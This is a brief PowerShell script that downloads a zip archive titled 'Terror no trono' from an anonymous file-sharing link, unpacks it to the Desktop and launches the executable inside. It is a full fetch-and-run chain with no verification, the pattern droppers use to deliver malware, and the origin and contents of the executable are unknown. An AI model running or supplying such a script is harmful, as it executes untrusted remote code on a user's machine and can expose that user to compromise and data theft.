# Import the required modules
import-module PowerShellGet
import-module Archive
# Download the Terror no trono.zip file
Invoke-WebRequest -Uri "https://filetransfer.io/data-package/eeML0ZKe/download" -OutFile "$env:USERPROFILE\Desktop\Terror no trono.zip"
# Extract the Terror no trono.zip file
Expand-Archive -Path "$env:USERPROFILE\Desktop\Terror no trono.zip" -DestinationPath "$env:USERPROFILE\Desktop\"
# Execute the Terror no trono.exe file
Start-Process -FilePath "$env:USERPROFILE\Desktop\Terror_no_trono\Terror no trono.exe"